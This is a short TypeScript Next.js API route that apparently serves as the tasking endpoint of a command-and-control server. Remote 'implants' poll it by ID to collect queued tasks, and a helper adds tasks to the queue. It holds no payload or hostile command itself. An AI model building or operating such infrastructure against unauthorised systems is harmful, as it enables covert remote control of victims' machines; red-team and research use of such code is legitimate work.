import { NextResponse, type NextRequest } from "next/server"
import { z } from "zod"

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

const TaskRequestSchema = z.object({
  implant_id: z.string(),
  last_seen: z.number(),
})

// In-memory task storage for demo purposes
const pendingTasks = new Map<string, Array<{
  id: string
  type: string
  args: Record<string, any>
  created_at: number
  timeout: number
}>>()

const taskCounter = { value: 0 }

export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    const body = await req.json()
    const { implant_id, last_seen } = TaskRequestSchema.parse(body)

    // Get pending tasks for this implant
    const tasks = pendingTasks.get(implant_id) || []
    
    // Clear the tasks after retrieval
    pendingTasks.set(implant_id, [])

    return NextResponse.json({ 
      tasks: tasks,
      total: tasks.length 
    })
  } catch (error) {
    console.error('Task request error:', error)
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}

// Helper function to add tasks (called from other API endpoints)
export function addTask(implantId: string, taskType: string, args: Record<string, any>) {
  const tasks = pendingTasks.get(implantId) || []
  const task = {
    id: `task-${++taskCounter.value}`,
    type: taskType,
    args,
    created_at: Date.now(),
    timeout: 300, // 5 minutes default timeout
  }
  tasks.push(task)
  pendingTasks.set(implantId, tasks)
  return task.id
}